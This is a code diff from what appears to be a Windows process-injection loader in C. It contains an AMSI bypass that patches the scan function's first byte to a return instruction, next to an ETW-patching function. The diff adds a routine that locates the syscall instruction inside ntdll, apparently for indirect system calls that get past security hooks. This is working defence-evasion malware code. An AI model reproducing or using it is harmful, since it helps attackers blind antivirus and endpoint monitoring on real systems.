@@ -3,7 +3,7 @@
 #include "injection.h"
 #include "config.h"
 DWORD g_ssn = 0;
-
+PVOID g_syscall = NULL;
 
 
 BOOL EtwPatch() {
@@ -146,7 +146,6 @@ BOOL AmsiPatch() {
 	if (pAmsiAddr == NULL) {
 		return 0;
 	}
-
 	DWORD oldProtect = 0;
 	if (VirtualProtect(pAmsiAddr, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
 		*(BYTE*)pAmsiAddr = 0xC3;
@@ -154,7 +153,6 @@ BOOL AmsiPatch() {
 		FlushInstructionCache(GetCurrentProcess(), pAmsiAddr, 1);
 		printf("[x] AMSI Patched!\n");
 		return 1;
-
 	}
 	else {
 		return 0;
@@ -206,7 +204,19 @@ DWORD getSSN(char* funcName) {
 	CloseHandle(hMappedNtdll);
 	CloseHandle(hNtdll);
 
-
 	return ssn;
+}
 
+PVOID getSyscallAddr(char* funcName) {
+
+	HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+
+	PVOID pfunc_addr = GetProcAddress(hNtdll, funcName);
+	BYTE* bfunc_addr = (BYTE*)pfunc_addr;
+	for (int i = 0; i < 32; i++) {
+		if (bfunc_addr[i] == 0x0F && bfunc_addr[i + 1] == 0x05) {
+			return (PVOID)&bfunc_addr[i];
+		}
+	}
+	return NULL;
 }
